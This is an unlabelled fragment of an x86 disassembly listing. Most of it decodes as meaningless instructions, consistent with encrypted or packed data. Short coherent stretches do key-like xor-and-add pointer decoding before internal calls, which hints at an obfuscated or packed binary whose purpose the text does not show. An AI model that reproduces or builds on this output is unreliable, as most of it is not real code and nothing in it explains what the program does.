  407b04:	or     eax,0xc73a944
  407b09:	ins    DWORD PTR es:[edi],dx
  407b0a:	cli    
  407b0b:	or     ah,bh
  407b0d:	mov    ah,0x9c
  407b0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b10:	lods   eax,DWORD PTR ds:[esi]
  407b11:	mov    eax,DWORD PTR [esi-0x39cc53fa]
  407b17:	add    eax,edi
  407b19:	push   eax
  407b1a:	mov    eax,DWORD PTR [ebp-0x10]
  407b1d:	add    eax,0xaa
  407b22:	push   eax
  407b23:	mov    eax,DWORD PTR [ebp-0x10]
  407b26:	mov    eax,DWORD PTR [eax+0x198]
  407b2c:	push   DWORD PTR [eax]
  407b2e:	jmp    0x407e7b
  407b33:	sahf   
  407b34:	das    
  407b35:	or     ah,BYTE PTR [edi]
  407b37:	mov    DWORD PTR [ecx],esp
  407b39:	mov    cl,0xb5
  407b3b:	pop    es
  407b3c:	mov    BYTE PTR [ebx],bl
  407b3e:	(bad)  
  407b3f:	or     dh,BYTE PTR [ecx+edx*2-0x66]
  407b43:	push   edi
  407b44:	leave  
  407b45:	jo     0x407bb7
  407b47:	and    BYTE PTR [ebp+0x70],bh
  407b4a:	jo     0x407b2b
  407b4c:	cs into 
  407b4e:	dec    eax
  407b4f:	nop
  407b50:	retf   0x520e
  407b53:	sbb    DWORD PTR [edi+0x5bd98513],edi
  407b59:	or     al,0x30
  407b5b:	mov    bl,0x1
  407b5d:	jo     0x407b07
  407b5f:	cmp    al,0x47
  407b61:	in     al,0x5c
  407b63:	fiadd  DWORD PTR [esi-0x1b726c54]
  407b69:	pop    esp
  407b6a:	pop    ecx
  407b6b:	(bad)  
  407b6d:	(bad)  
  407b6e:	ror    edx,0xdc
  407b71:	mov    ebp,0x4a896645
  407b76:	dec    edi
  407b77:	xor    BYTE PTR [ebx-0x68],0xe9
  407b7b:	(bad)
  407b7f:	cdq    
  407b80:	ficomp DWORD PTR [ebx-0x190b149]
  407b86:	cwde   
  407b87:	retf   0x1972
  407b8a:	repnz into 
  407b8c:	out    0xf8,eax
  407b8e:	sbb    esi,DWORD PTR ds:0xf342a6f2
  407b94:	pop    edx
  407b95:	ror    DWORD PTR [ebx-0x15],cl
  407b98:	sahf   
  407b99:	cmp    eax,0x3deb7f5d
  407b9e:	add    esp,ebx
  407ba0:	dec    esp
  407ba1:	out    0xa3,al
  407ba3:	je     0x407b68
  407ba5:	repz jg 0x407c15
  407ba8:	pop    esi
  407ba9:	mov    gs,ebx
  407bab:	sub    eax,0x50081622
  407bb0:	sbb    BYTE PTR [edi-0x7d],al
  407bb3:	and    al,0x69
  407bb5:	inc    ebp
  407bb6:	or     al,0x63
  407bb8:	hlt    
  407bb9:	das    
  407bba:	mov    edi,0x51b164a9
  407bbf:	mov    eax,edx
  407bc1:	ficomp WORD PTR [esi-0x29cc29bb]
  407bc7:	leavew 
  407bc9:	push   ebp
  407bca:	(bad)  
  407bcc:	push   0x36
  407bce:	push   ebx
  407bcf:	ror    bh,0xe6
  407bd2:	push   ebp
  407bd3:	xor    al,BYTE PTR [esi]
  407bd5:	gs jp  0x407b96
  407bd8:	jmp    0xf7ed:0xcc2e5ccf
  407bdf:	mov    bl,0xea
  407be1:	or     BYTE PTR [edx],bh
  407be3:	and    al,BYTE PTR [ecx]
  407be5:	ins    DWORD PTR es:[edi],dx
  407be6:	ror    BYTE PTR [ebx+0x6b],cl
  407be9:	out    dx,eax
  407bea:	or     ebp,DWORD PTR [eax]
  407bec:	rcr    BYTE PTR [esi-0x133afc02],0xe
  407bf3:	sbb    BYTE PTR [esi+0x3f],ah
  407bf6:	lahf   
  407bf7:	pop    es
  407bf8:	mov    esp,0xb4b9e155
  407bfd:	adc    BYTE PTR [ebp+0x197fb1c3],bh
  407c03:	pop    esp
  407c04:	push   0x94e941eb
  407c09:	xor    DWORD PTR [esi-0x4e4f45f1],eax
  407c0f:	aad    0x37
  407c11:	sahf   
  407c12:	dec    esi
  407c13:	or     eax,0xbeab930
  407c18:	or     al,0xc4
  407c1a:	cmp    esp,DWORD PTR [edi]
  407c1c:	inc    eax
  407c1d:	sbb    eax,0x649d5f6f
  407c22:	retf   0xcd28
  407c25:	daa    
  407c26:	daa    
  407c27:	imul   DWORD PTR [esi]
  407c29:	mov    eax,ds:0xbb1c045c
  407c2e:	jnp    0x407bce
  407c30:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  407c32:	cmp    BYTE PTR [edx],al
  407c34:	popf   
  407c35:	mov    ch,0x8b
  407c37:	mov    edi,0xcaf189dd
  407c3c:	mov    bh,BYTE PTR [ebx]
  407c3e:	stc    
  407c3f:	push   esp
  407c40:	sub    ecx,DWORD PTR [ebp+0x38]
  407c43:	and    eax,0x4ddcb44b
  407c48:	dec    eax
  407c49:	mov    DWORD PTR [edx+0x72eb9978],edx
  407c4f:	mov    al,0xa2
  407c51:	xlat   BYTE PTR ds:[ebx]
  407c52:	rol    bl,0x2d
  407c55:	pop    ss
  407c56:	push   0xab97ce6c
  407c5b:	pop    esp
  407c5c:	fbld   TBYTE PTR [edx+0x17]
  407c5f:	shr    DWORD PTR [edi+0x20f0c800],cl
  407c65:	jge    0x407c17
  407c67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c68:	xchg   esi,eax
  407c69:	scas   al,BYTE PTR es:[edi]
  407c6a:	mov    dh,0x87
  407c6c:	lods   al,BYTE PTR ds:[esi]
  407c6d:	pop    ebp
  407c6e:	mov    cl,0x33
  407c70:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  407c72:	push   eax
  407c73:	inc    edi
  407c74:	xchg   esi,eax
  407c75:	test   al,0x27
  407c77:	jno    0x407cb2
  407c79:	xchg   ebp,eax
  407c7a:	sbb    eax,0x4c5f38b6
  407c7f:	and    al,0x65
  407c81:	call   FWORD PTR [eax+0x19]
  407c84:	push   esp
  407c85:	dec    esi
  407c86:	sub    BYTE PTR [ebp-0x6b9dee50],dl
  407c8c:	ins    BYTE PTR es:[edi],dx
  407c8d:	ins    BYTE PTR es:[edi],dx
  407c8e:	lds    edi,FWORD PTR [esi-0x31cf7dae]
  407c94:	sub    eax,0xe2d48c7c
  407c99:	pushf  
  407c9a:	sub    BYTE PTR [ecx-0x52],bl
  407c9d:	jae    0x407c8f
  407c9f:	or     eax,0x856ac8ce
  407ca4:	add    eax,0x9130bdee
  407ca9:	push   cs
  407caa:	ror    BYTE PTR [esp+ecx*8],cl
  407cad:	push   ebx
  407cae:	cmp    eax,DWORD PTR [edi+0x750eb485]
  407cb4:	arpl   WORD PTR [ebx+0x69],si
  407cb7:	push   edx
  407cb8:	ret    
  407cb9:	cmp    dh,BYTE PTR [eax+0x7]
  407cbc:	add    al,0x91
  407cbe:	jbe    0x407c78
  407cc0:	pop    edx
  407cc1:	sub    cl,bl
  407cc3:	mov    ebp,0x2613d95
  407cc8:	mov    DWORD PTR [esi+0x29767693],ecx
  407cce:	cdq    
  407ccf:	xor    eax,0x7ae975f
  407cd4:	push   ds
  407cd5:	(bad)  
  407cd6:	lock mov ds:0xc411165d,eax
  407cdc:	das    
  407cdd:	add    ebp,esi
  407cdf:	scas   eax,DWORD PTR es:[edi]
  407ce0:	mov    ds:0x723e6591,al
  407ce5:	shl    DWORD PTR [ebp+0x26b10b3f],cl
  407ceb:	mov    bl,0xd0
  407ced:	dec    ecx
  407cee:	les    edx,FWORD PTR [edi+ebx*4-0x6f49c62e]
  407cf5:	xchg   edi,eax
  407cf6:	mov    cl,0x96
  407cf8:	xor    WORD PTR [ecx],bp
  407cfb:	dec    edi
  407cfc:	loopne 0x407d10
  407cfe:	loop   0x407cbd
  407d00:	sub    DWORD PTR [ebp-0x62],edi
  407d03:	lods   eax,DWORD PTR ds:[esi]
  407d04:	pop    ss
  407d05:	not    DWORD PTR [eax]
  407d07:	inc    ebx
  407d08:	push   ss
  407d09:	xor    eax,0x2abaa389
  407d0e:	sub    eax,0xfa36c14f
  407d13:	mov    ebx,0xeab70b09
  407d18:	pop    edi
  407d19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d1a:	pop    ebx
  407d1b:	push   cs
  407d1c:	push   edx
  407d1d:	push   ds
  407d1e:	jns    0x407d71
  407d20:	mov    edx,0x552b30e5
  407d25:	es mov eax,0x20d37da3
  407d2b:	push   ss
  407d2c:	cmp    BYTE PTR [edx+0x2a],dl
  407d2f:	loopne 0x407d8d
  407d31:	push   ss
  407d32:	jp     0x407ce1
  407d34:	arpl   WORD PTR [esi-0x1f],sp
  407d37:	loopne 0x407ccd
  407d39:	pop    ebx
  407d3a:	sbb    esp,ebx
  407d3c:	retf   0xc0b5
  407d3f:	cwde   
  407d40:	(bad)  
  407d41:	push   ebx
  407d42:	jmp    0x82a1:0xf9e672be
  407d49:	jle    0x407d28
  407d4b:	mov    edx,0xedb8a1d1
  407d50:	std    
  407d51:	sub    BYTE PTR [ebx],bh
  407d53:	xlat   BYTE PTR ds:[ebx]
  407d54:	push   edi
  407d55:	sbb    eax,0xfaa1531c
  407d5a:	or     edi,esp
  407d5c:	push   edi
  407d5d:	xchg   BYTE PTR [edi+eiz*4-0x310a3929],al
  407d64:	push   eax
  407d65:	jge    0x407dc0
  407d67:	in     al,dx
  407d68:	xchg   DWORD PTR [esi],eax
  407d6a:	out    dx,al
  407d6b:	cs hlt 
  407d6d:	cmp    edx,DWORD PTR [eax+0x743d2288]
  407d73:	les    eax,FWORD PTR [esi]
  407d75:	push   ecx
  407d76:	and    ebp,ebx
  407d78:	pop    edx
  407d79:	sub    ebp,DWORD PTR ss:[ebp-0x7c]
  407d7d:	mov    ch,0x8e
  407d7f:	jecxz  0x407d9b
  407d81:	iret   
  407d82:	out    dx,eax
  407d83:	imul   esi,DWORD PTR [ebx-0x2e],0x9
  407d87:	mov    esp,0xc5a51b0e
  407d8c:	loopne 0x407e02
  407d8e:	rcr    DWORD PTR ds:0xe436e6af,cl
  407d94:	sub    al,0x2e
  407d96:	in     al,dx
  407d97:	or     esp,ecx
  407d99:	call   0x51e3744a
  407d9e:	add    DWORD PTR [esi+0x6c],ecx
  407da1:	xor    BYTE PTR ds:0x8cd9931f,0xa7
  407da8:	(bad)  
  407da9:	mov    esp,0x564d36b4
  407dae:	faddp  st(3),st
  407db0:	mov    ch,0x63
  407db2:	sbb    DWORD PTR [eax+0x7d3decc6],ebp
  407db8:	(bad)  
  407db9:	jae    0x407dbb
  407dbb:	mov    dh,0x78
  407dbd:	inc    eax
  407dbe:	into   
  407dbf:	fsubr  DWORD PTR [edi]
  407dc1:	or     edi,DWORD PTR [ecx-0x4271141]
  407dc7:	sar    BYTE PTR [ebp+0x50],1
  407dca:	sbb    bh,BYTE PTR [edx-0x61]
  407dcd:	wrmsr  
  407dcf:	enter  0x6981,0xd9
  407dd3:	xchg   esi,eax
  407dd4:	(bad)  
  407dd6:	shl    DWORD PTR [ebx-0x51184405],1
  407ddc:	jmp    0x9f4c18ee
  407de1:	les    edx,FWORD PTR [esi+0x7]
  407de4:	xor    DWORD PTR [edi+0x25],ecx
  407de7:	dec    esp
  407de8:	out    dx,eax
  407de9:	scas   al,BYTE PTR es:[edi]
  407dea:	sbb    bl,al
  407dec:	push   esp
  407ded:	je     0x407da2
  407def:	ja     0x407d94
  407df1:	test   DWORD PTR [esi+0x2686076f],0x5fc55f45
  407dfb:	test   DWORD PTR [esp+eax*8-0x3],0x3a72786
  407e03:	xchg   esi,eax
  407e04:	jo     0x407e3d
  407e06:	outs   dx,DWORD PTR ds:[esi]
  407e07:	mov    edx,0x7fc57eb1
  407e0c:	cmp    ebp,DWORD PTR [eax-0x46]
  407e0f:	dec    ecx
  407e10:	push   cs
  407e11:	pushw  ss
  407e13:	jl     0x407dd3
  407e15:	bound  esp,QWORD PTR [edx]
  407e17:	cmp    ah,BYTE PTR [edx+0x75]
  407e1a:	cli    
  407e1b:	outs   dx,DWORD PTR ds:[esi]
  407e1c:	(bad)  [edx-0x10]
  407e20:	sbb    edx,ecx
  407e22:	les    edi,FWORD PTR [ebp+0x21]
  407e25:	add    BYTE PTR [edi],ah
  407e27:	pop    esp
  407e28:	sar    BYTE PTR ds:[ecx-0x5b],0xe6
  407e2d:	dec    eax
  407e2e:	das    
  407e2f:	imul   ecx,esp,0x7f
  407e32:	pop    es
  407e33:	(bad)  
  407e34:	fucomp st(6)
  407e36:	mov    DWORD PTR [ecx-0x39d3658a],esp
  407e3c:	inc    esi
  407e3d:	pushf  
  407e3e:	(bad)  
  407e40:	outs   dx,BYTE PTR ds:[si]
  407e42:	ins    DWORD PTR es:[edi],dx
  407e43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e44:	data16 fucomip st,st(6)
  407e47:	ret    0x24a9
  407e4a:	mov    esp,0x3df17425
  407e4f:	xchg   esp,eax
  407e50:	push   es
  407e51:	ror    BYTE PTR [eax+0x2f],0x6
  407e55:	in     al,0x20
  407e57:	cwde   
  407e58:	jg     0x407e67
  407e5a:	inc    ebp
  407e5b:	xchg   DWORD PTR [ebx-0x16581c0],ebx
  407e61:	and    BYTE PTR ds:0xb6964305,dh
  407e67:	(bad)  
  407e68:	cmp    eax,DWORD PTR [ebx+0x18]
  407e6b:	push   esp
  407e6c:	repz ret 0x1bc
  407e70:	push   edx
  407e71:	(bad)  
  407e72:	sahf   
  407e73:	jns    0x407e6c
  407e75:	fist   DWORD PTR [ebp-0x67]
  407e78:	aas    
  407e79:	ss aaa 
  407e7b:	call   0x4120bb
  407e80:	mov    DWORD PTR [ebp-0x8],eax
  407e83:	cmp    DWORD PTR [ebp-0x8],0x0
  407e87:	jmp    0x4081d4
  407e8c:	in     eax,0xe6
  407e8e:	outs   dx,DWORD PTR ds:[esi]
  407e8f:	pop    ebp
  407e90:	outs   dx,DWORD PTR ds:[esi]
  407e91:	jne    0x407e88
  407e93:	data16 hlt 
  407e95:	test   ebx,eax
  407e97:	pushf  
  407e98:	jp     0x407e40
  407e9a:	rol    BYTE PTR ds:0x7070d507,cl
  407ea0:	and    BYTE PTR [ebp+0x70],bh
  407ea3:	jo     0x407e57
  407ea5:	repz mov ch,0x70
  407ea8:	sbb    al,0x96
  407eaa:	aas    
  407eab:	adc    DWORD PTR [eax-0x13219329],ebx
  407eb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407eb2:	daa    
  407eb3:	push   ebp
  407eb4:	mov    eax,ds:0x88deccf
  407eb9:	sbb    DWORD PTR [eax-0x3f30990c],ecx
  407ebf:	push   ss
  407ec0:	pop    ebp
  407ec1:	(bad)  
  407ec2:	(bad)  
  407ec3:	and    edi,edx
  407ec5:	mov    al,0xd3
  407ec7:	xor    eax,0x8bfced8d
  407ecc:	addr16 (bad) 
  407ece:	in     al,0x6f
  407ed0:	mov    ah,0xf4
  407ed2:	in     al,dx
  407ed3:	rcl    BYTE PTR [ecx-0xb35caf5],0xbb
  407eda:	loopne 0x407f08
  407edc:	sub    esi,ebp
  407ede:	jle    0x407ead
  407ee0:	and    BYTE PTR [ecx],cl
  407ee2:	cli    
  407ee3:	dec    esp
  407ee4:	fisttp DWORD PTR [eax+ecx*2]
  407ee7:	mov    ecx,DWORD PTR [eax+ecx*8+0x7b76f901]
  407eee:	arpl   WORD PTR [edi+0x7cd1695d],cx
  407ef4:	sub    BYTE PTR [ebx+0x5e],bh
  407ef7:	mov    DWORD PTR [edi],ecx
  407ef9:	sbb    al,0x63
  407efb:	data16 or bh,dh
  407efe:	sbb    dh,BYTE PTR [edi]
  407f00:	push   es
  407f01:	sbb    edi,DWORD PTR [ebx-0x1a]
  407f04:	outs   dx,BYTE PTR ds:[esi]
  407f05:	pop    ss
  407f06:	inc    edi
  407f07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f08:	jno    0x407f00
  407f0a:	push   0xffffff8e
  407f0c:	into   
  407f0d:	xor    DWORD PTR [ecx],0x3087741d
  407f13:	sbb    BYTE PTR [edi+0x19c6282d],dh
  407f19:	pop    ss
  407f1a:	js     0x407f95
  407f1c:	push   ss
  407f1d:	jg     0x407ee1
  407f1f:	pushf  
  407f20:	mov    bl,0x8e
  407f22:	push   ss
  407f23:	repz ds popa 
  407f26:	xlat   BYTE PTR ds:[ebx]
  407f27:	pusha  
  407f28:	cdq    
  407f29:	adc    eax,0xb6e4e230
  407f2e:	(bad)  
  407f2f:	shl    DWORD PTR [ebx-0x5c],0xd3
  407f33:	xchg   ebx,eax
  407f34:	push   ecx
  407f35:	mov    dl,0x91
  407f37:	loope  0x407f0d
  407f39:	jnp    0x407fb8
  407f3b:	jmp    DWORD PTR [ebx]
  407f3d:	mov    cl,0xd1
  407f3f:	out    0x1c,al
  407f41:	cmp    eax,0xbd7cef31
  407f46:	sbb    ebp,DWORD PTR [esi]
  407f48:	xchg   ebx,eax
  407f49:	popf   
  407f4a:	sub    eax,0x75bf5f95
  407f4f:	mov    ah,0xd8
  407f51:	stc    
  407f52:	inc    ebx
  407f53:	sbb    bh,0x8d
  407f56:	loop   0x407f7a
  407f58:	dec    edx
  407f59:	stos   BYTE PTR es:[edi],al
  407f5a:	jnp    0x407efe
  407f5c:	lods   al,BYTE PTR ds:[esi]
  407f5d:	(bad)  
  407f5e:	push   ebx
  407f5f:	push   ds
  407f60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f61:	mov    esp,0x2e50dca9
  407f66:	popf   
  407f67:	in     eax,0xa0
  407f69:	outs   dx,DWORD PTR ds:[esi]
  407f6a:	jmp    0x407f80
  407f6c:	xchg   edi,eax
  407f6d:	sub    BYTE PTR [esi+ecx*2+0x6ae937c1],bh
  407f74:	xor    eax,edx
  407f76:	dec    esi
  407f77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f78:	pop    esi
  407f79:	and    BYTE PTR [ebx],al
  407f7b:	jo     0x407f48
  407f7d:	test   BYTE PTR [edi+0x726e461e],al
  407f83:	rcl    bh,0xbd
  407f86:	mov    eax,0x74464f94
  407f8b:	sbb    eax,0xf76ae255
  407f90:	mov    edx,0xa7d0e718
  407f95:	cmp    bl,dl
  407f97:	xchg   ebx,eax
  407f98:	ins    DWORD PTR es:[edi],dx
  407f99:	pop    ss
  407f9a:	adc    ah,BYTE PTR [bp+si]
  407f9d:	lods   al,BYTE PTR ds:[esi]
  407f9e:	pop    esi
  407f9f:	js     0x407f78
  407fa1:	xor    ebp,DWORD PTR [eax]
  407fa3:	mov    ds:0xbb649217,eax
  407fa8:	push   0xbf249a08
  407fad:	neg    DWORD PTR [edi+0x1]
  407fb0:	call   0xf3e9:0x9acc7bb9
  407fb7:	mov    ah,0xe2
  407fb9:	in     eax,dx
  407fba:	mov    ds:0xd5d8eabd,al
  407fbf:	dec    esi
  407fc1:	call   0xf6d:0x178d28c2
  407fc8:	inc    edx
  407fc9:	dec    esi
  407fca:	outs   dx,BYTE PTR ds:[esi]
  407fcb:	mov    eax,DWORD PTR [esi-0x34f6ea2e]
  407fd1:	mov    ebx,0xf92b5332
  407fd6:	or     DWORD PTR [edi+0x59d4f8ac],esp
  407fdc:	jle    0x407fba
  407fde:	dec    ah
  407fe0:	xchg   ebx,eax
  407fe1:	xchg   ebx,eax
  407fe2:	pop    ebp
  407fe3:	and    esi,DWORD PTR [ecx-0x35]
  407fe6:	leave  
  407fe7:	fdecstp 
  407fe9:	loope  0x408038
  407feb:	lods   eax,DWORD PTR ds:[esi]
  407fec:	(bad)  
  407fee:	xlat   BYTE PTR ds:[ebx]
  407fef:	inc    ebx
  407ff0:	retf   0xf1cc
  407ff3:	sub    edi,esi
  407ff5:	les    edi,FWORD PTR ds:0x249ed445
  407ffb:	call   0x585d:0x7d1923bc
  408002:	retf   
  408003:	jg     0x408027
  408005:	adc    edx,edi
  408007:	sbb    ah,BYTE PTR [edi]
  408009:	sbb    BYTE PTR [ecx],dl
  40800b:	stos   DWORD PTR es:[edi],eax
  40800c:	mov    ah,0x1a
  40800e:	call   DWORD PTR [esp+ecx*1-0x3d]
  408012:	clc    
  408013:	cwde   
  408014:	int    0x51
  408016:	mov    esp,0x72b0cc43
  40801b:	shl    BYTE PTR [esi+0x54],0x2
  40801f:	aas    
  408020:	out    0x15,eax
  408022:	xchg   ebp,eax
  408023:	inc    ebx
  408024:	in     eax,0xa5
  408026:	jbe    0x408053
  408028:	push   ecx
  408029:	mov    cl,0x29
  40802b:	fnsave [ebp-0x52]
  40802e:	mov    ebp,DWORD PTR [ecx+edi*1]
  408031:	xchg   edi,eax
  408032:	dec    eax
  408033:	jecxz  0x40805a
  408035:	and    eax,0xfadec92c
  40803a:	and    al,0xec
  40803c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40803d:	cs (bad) 
  40803f:	fmulp  st(4),st
  408041:	retf   
  408042:	hlt    
  408043:	mov    esp,0xab46619f
  408048:	cld    
  408049:	and    eax,0x5af8dd6d
  40804e:	xchg   esi,eax
  40804f:	outs   dx,DWORD PTR ds:[esi]
  408050:	test   BYTE PTR [edx],al
  408052:	ins    BYTE PTR es:[edi],dx
  408053:	sbb    esp,DWORD PTR ds:[edi+edi*4]
  408057:	iret   
  408058:	adc    dh,BYTE PTR [esi]
  40805a:	pop    ecx
  40805b:	and    eax,0x18234e0
  408060:	pop    ds
  408061:	mov    al,0x7c
  408063:	xchg   DWORD PTR [ebx],esp
  408065:	loop   0x407fec
  408067:	mov    ?,WORD PTR [ebx-0x4f]
  40806a:	adc    al,0xd8
  40806c:	mov    esp,0xfc8fff3d
  408071:	mov    ds:0x7c8a3a98,eax
  408076:	enter  0x6ae8,0x40
  40807a:	ss mov ah,0x9d
  40807d:	lods   eax,DWORD PTR ds:[esi]
  40807e:	add    dh,BYTE PTR [eax-0x5e]
  408081:	push   cs
  408082:	xchg   esi,eax
  408083:	mov    ebx,0x1f69e7a0
  408088:	retf   
  408089:	iret   
  40808a:	stc    
  40808b:	shl    BYTE PTR [edi-0x7b],cl
  40808e:	push   ebp
  40808f:	xchg   ebx,eax
  408090:	xor    eax,DWORD PTR [eax]
  408092:	arpl   WORD PTR [esi-0x1c],si
  408095:	xchg   esp,ecx
  408097:	inc    edx
  408098:	mov    ecx,0x79a38c1d
  40809d:	adc    BYTE PTR [edi-0x48],0xd5
  4080a1:	mov    ah,0x1f
  4080a3:	jecxz  0x408107
  4080a5:	mov    al,0x23
  4080a7:	sbb    ebx,DWORD PTR [edx]
  4080a9:	stc    
  4080aa:	int3   
  4080ab:	(bad)  
  4080ac:	int    0xfa
  4080ae:	jb     0x40806f
  4080b0:	mov    esp,0x44b8ecc3
  4080b5:	jnp    0x40804c
  4080b7:	loope  0x408122
  4080b9:	icebp  
  4080ba:	not    DWORD PTR [esi]
  4080bc:	sub    bh,ch
  4080be:	xor    al,0x2c
  4080c0:	in     eax,dx
  4080c1:	push   edx
  4080c2:	mov    dh,0x93
  4080c4:	inc    ecx
  4080c5:	fld    TBYTE PTR [edx+0x7]
  4080c8:	int    0x8e
  4080ca:	xchg   ecx,ecx
  4080cc:	push   es
  4080cd:	jne    0x408077
  4080cf:	fprem  
  4080d1:	fdiv   QWORD PTR [ecx-0xa3c1c3]
  4080d7:	push   esp
  4080d8:	and    eax,0x60a0e4ab
  4080dd:	ja     0x408154
  4080df:	push   ebp
  4080e0:	mov    eax,0x739bbab6
  4080e5:	mov    ch,0xa
  4080e7:	inc    edx
  4080e8:	ins    DWORD PTR es:[edi],dx
  4080e9:	call   0x64a7:0x80826127
  4080f0:	push   ebp
  4080f1:	push   cs
  4080f2:	mov    bl,0xa1
  4080f4:	jge    0x4080a0
  4080f6:	push   ebx
  4080f7:	cmp    ebp,DWORD PTR [eax]
  4080f9:	adc    BYTE PTR [esp+esi*2],cl
  4080fc:	shl    BYTE PTR [edi+eiz*4-0x21],0xf8
  408101:	int    0x27
  408103:	or     ecx,ecx
  408105:	loop   0x4080ab
  408107:	add    al,0xb3
  408109:	in     al,0xa3
  40810b:	test   BYTE PTR [edi+ebp*1-0x71],ch
  40810f:	xor    BYTE PTR [edx],bl
  408111:	jb     0x408169
  408113:	cdq    
  408114:	hlt    
  408115:	xlat   BYTE PTR ds:[ebx]
  408116:	fimul  DWORD PTR [eax+ecx*1+0x41]
  40811a:	std    
  40811b:	arpl   WORD PTR [edx],sp
  40811d:	add    esi,edx
  40811f:	mov    ah,BYTE PTR [eax+esi*2]
  408122:	popf   
  408123:	jbe    0x4080eb
  408125:	jecxz  0x40812e
  408127:	sub    DWORD PTR [ebx+esi*4],0xfffffffe
  40812b:	adc    dl,bh
  40812d:	mov    bx,0x2442
  408131:	xchg   esi,eax
  408132:	inc    ecx
  408133:	xchg   bl,dl
  408135:	add    edx,DWORD PTR [ebx]
  408137:	sub    edi,DWORD PTR [ecx-0x1c]
  40813a:	int3   
  40813b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40813c:	jb     0x40817e
  40813e:	fnsave [eax]
  408140:	test   BYTE PTR [ebx-0x146e9044],ch
  408146:	push   0x12
  408148:	jl     0x4080ee
  40814a:	pop    ecx
  40814b:	outs   dx,BYTE PTR ds:[esi]
  40814c:	out    0x6d,al
  40814e:	enter  0x342d,0xfd
  408152:	shl    DWORD PTR [ebx],1
  408154:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408155:	and    esp,DWORD PTR [ebp-0x51]
  408158:	ds pop es
  40815a:	stos   BYTE PTR es:[edi],al
  40815b:	xchg   esi,eax
  40815c:	rol    DWORD PTR [esi-0x17fd572e],cl
  408162:	shr    ebp,0x0
  408165:	lods   eax,DWORD PTR ds:[esi]
  408166:	sbb    edi,DWORD PTR [ebp-0x15]
  408169:	mov    WORD PTR [eax-0x6f8823b0],gs
  40816f:	push   0x17
  408171:	inc    edi
  408172:	xchg   BYTE PTR [ebx-0x6ea16890],al
  408178:	lods   eax,DWORD PTR ds:[esi]
  408179:	and    ah,BYTE PTR [esi-0x2a]
  40817c:	pop    ds
  40817d:	sysret 
  40817f:	sbb    esp,edi
  408181:	out    0xfa,eax
  408183:	xchg   edx,eax
  408184:	sbb    eax,0x214a2bc9
  408189:	mov    cs,edi
  40818b:	jae    0x4081dc
  40818d:	ror    DWORD PTR [eax+0x3296d960],cl
  408193:	leave  
  408194:	mov    edi,0x2656de98
  408199:	push   ds
  40819a:	jne    0x408209
  40819c:	clc    
  40819d:	cmp    eax,0x283ec203
  4081a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081a3:	into   
  4081a4:	pop    esp
  4081a5:	dec    eax
  4081a6:	push   ecx
  4081a7:	xor    edi,edx
  4081a9:	adc    DWORD PTR [ebp+0x5d],edx
  4081ac:	inc    esp
  4081ad:	(bad)  
  4081ae:	jecxz  0x40816b
  4081b0:	out    dx,eax
  4081b1:	ins    DWORD PTR es:[edi],dx
  4081b2:	std    
  4081b3:	mov    ecx,0x3552eda7
  4081b8:	sub    cl,BYTE PTR [eax]
  4081ba:	mov    cl,0x37
  4081bc:	xchg   ebp,esp
  4081be:	shr    DWORD PTR [ecx],cl
  4081c0:	sub    ebp,DWORD PTR [ebp+0x57]
  4081c3:	out    dx,eax
  4081c4:	mov    esp,0xcfd78e7d
  4081c9:	or     BYTE PTR [ebx-0x9f64cb1],0xa6
  4081d0:	icebp  
  4081d1:	mov    ah,0x70
  4081d3:	lea    eax,ds:[ebp+0x4]
  4081d7:	mov    DWORD PTR [ebp-0x20],eax
  4081da:	je     0x40966c
  4081e0:	lea    eax,[ebp-0x18]
  4081e3:	push   eax
  4081e4:	mov    eax,DWORD PTR [ebp-0x2c]
  4081e7:	xor    eax,esi
  4081e9:	add    eax,edi
  4081eb:	push   eax
  4081ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4081ef:	xor    eax,esi
  4081f1:	add    eax,edi
  4081f3:	push   eax
  4081f4:	push   DWORD PTR [ebp-0x8]
  4081f7:	lea    eax,[ebp-0x78]
  4081fa:	push   eax
  4081fb:	push   DWORD PTR [ebp-0xc]
  4081fe:	push   DWORD PTR [ebp-0x14]
  408201:	call   0x406508
  408206:	test   eax,eax
  408208:	je     0x408233
  40820e:	lea    eax,[ebp-0x78]
  408211:	push   eax
  408212:	mov    eax,DWORD PTR [ebp-0x14]
  408215:	xor    eax,esi
  408217:	add    eax,edi
  408219:	push   eax
  40821a:	mov    eax,DWORD PTR [ebp-0x10]
  40821d:	add    eax,0xee
  408222:	push   eax
  408223:	mov    eax,DWORD PTR [ebp-0x10]
  408226:	mov    eax,DWORD PTR [eax+0x198]
  40822c:	push   DWORD PTR [eax]
  40822e:	call   0x4120bb
  408233:	mov    ecx,DWORD PTR [ebp-0x1c]
  408236:	xor    ecx,esi
  408238:	mov    eax,0xffcd8d64
  40823d:	sub    eax,ecx
  40823f:	sub    eax,DWORD PTR [ebp-0x8]
  408242:	mov    ecx,DWORD PTR [ebp-0x30]
  408245:	add    ecx,eax
  408247:	mov    eax,DWORD PTR [ebp-0x8]
  40824a:	mov    DWORD PTR [eax+0x1],ecx
  40824d:	mov    al,BYTE PTR [ebp-0x1]
  408250:	mov    ecx,DWORD PTR [ebp-0x8]
  408253:	xor    al,0x47
  408255:	sub    al,0x37
  408257:	jmp    0x4085a4
  40825c:	ja     0x408201
  40825e:	mov    ecx,0x7175496f
  408263:	mov    ds:0xd6da6ce9,eax
  408268:	mov    edi,0x379f29b7
  40826d:	shl    BYTE PTR [eax+0x70],cl
  408270:	and    BYTE PTR [ebp+0x70],bh
  408273:	jo     0x40828a
  408275:	and    BYTE PTR [edi-0x61],dh
  408278:	enter  0xd54c,0xc4
  40827c:	repz mov ecx,0xbf574d46
  408282:	in     eax,0x1f
  408284:	pop    es
  408285:	fst    DWORD PTR [ecx]
